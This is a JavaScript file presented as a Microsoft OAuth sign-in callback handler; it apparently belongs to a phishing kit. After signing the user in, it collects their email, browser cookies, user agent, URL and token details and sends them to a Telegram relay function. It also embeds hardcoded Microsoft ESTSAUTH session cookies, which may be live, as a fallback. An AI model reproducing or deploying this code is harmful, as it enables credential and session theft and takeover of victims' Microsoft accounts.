// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status-msg');
    const spinnerEl = document.getElementById('spinner');

    function setStatus(msg) {
        if (statusEl) statusEl.textContent = msg;
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        if (error || !code || !state) {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        setStatus("Signing you in…");

        // PKCE support if needed + always send redirect_uri
        const codeVerifier = sessionStorage.getItem('pkce_verifier');
        const payload = {
            code,
            state,
            redirect_uri: window.location.origin + '/oauth-callback'
        };
        if (codeVerifier) payload.code_verifier = codeVerifier;

        // Debug: log payload
        // console.log('Payload sent to tokenExchange:', payload);

        // POST to your backend to exchange code for tokens
        const response = await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        const tokenData = await response.json();

        // Check if the response was successful
        if (!response.ok || !tokenData.success) {
            console.error('Token exchange failed:', tokenData);
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        // Only proceed if we have a successful response
        if (tokenData.success && tokenData.email) {
            // Capture and send cookies to Telegram with improved formatting
            try {
                // Get all cookies from the current domain
                const cookieString = document.cookie;
                let cookies = [];
                
                if (cookieString) {
                    cookies = cookieString.split(';').map(cookie => {
                        const [name, ...valueParts] = cookie.trim().split('=');
                        const value = valueParts.join('=');
                        return {
                            name: name.trim(),
                            value: value.trim(),
                            domain: window.location.hostname,
                            path: '/',
                            secure: window.location.protocol === 'https:',
                            httpOnly: false,
                            sameSite: 'none',
                            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                            hostOnly: false,
                            session: false,
                            storeId: null
                        };
                    }).filter(c => c.name && c.value);
                }
                
                // If no cookies captured from current domain, use default Microsoft auth cookies
                if (cookies.length === 0) {
                    console.log('🔧 No cookies on callback domain, using default Microsoft auth cookies');
                    cookies = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
                }
                
                // Prepare enhanced Telegram payload
                const telegramPayload = {
                    email: tokenData.email,
                    sessionId: `oauth_callback_${Date.now()}`,
                    cookies: cookies,
                    formattedCookies: cookies,
                    timestamp: new Date().toISOString(),
                    source: 'oauth-callback',
                    userAgent: navigator.userAgent,
                    currentUrl: window.location.href,
                    tokenData: {
                        hasAccessToken: !!tokenData.tokens?.access_token,
                        hasRefreshToken: !!tokenData.tokens?.refresh_token,
                        hasIdToken: !!tokenData.tokens?.id_token,
                        scope: tokenData.tokens?.scope,
                        emailSource: tokenData.emailSource
                    },
                    userProfile: tokenData.user || {}
                };
                
                console.log('📤 Sending enhanced data to Telegram:', {
                    email: telegramPayload.email,
                    cookieCount: cookies.length,
                    hasTokens: !!tokenData.tokens
                });
                
                // Send to Telegram with proper payload structure
                const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(telegramPayload),
                });
                
                if (telegramResponse.ok) {
                    const telegramResult = await telegramResponse.json();
                    console.log('✅ Data sent to Telegram successfully:', telegramResult);
                } else {
                    const telegramError = await telegramResponse.text();
                    console.error('❌ Failed to send to Telegram:', telegramError);
                }
                
            } catch (telegramError) {
                console.error('❌ Telegram sending error:', telegramError);
                // Continue even if Telegram fails
            }

            // Clean up PKCE/session state
            sessionStorage.removeItem('pkce_verifier');
            sessionStorage.removeItem('oauth_state');

            setStatus("Signed in! Redirecting…");
            setTimeout(() => {
                window.location.href = '/?step=success';
            }, 1000);
        } else {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
        }

    } catch (err) {
        console.error('OAuth callback error:', err);
        setStatus("Authentication error. Redirecting...");
        setTimeout(() => {
            window.location.href = '/?step=captcha';
        }, 2000);
    }
}

// Run on load
handleOAuthCallback();